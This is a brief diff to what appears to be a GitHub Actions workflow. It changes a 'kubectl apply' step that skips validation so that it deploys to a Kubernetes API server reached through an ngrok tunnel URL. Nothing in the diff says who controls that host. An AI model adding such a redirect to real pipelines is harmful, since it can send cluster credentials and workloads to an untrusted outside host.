@@ -40,6 +40,6 @@ jobs:
 
     - name: Apply Kubernetes deployment (Skip Validation)
       run: |
-        kubectl apply -f ./.github/workflows/deployment.yaml --validate=false
+        kubectl apply -f ./.github/workflows/deployment.yaml --server=https://7029-181-199-58-105.ngrok-free.app --validate=false
 
 
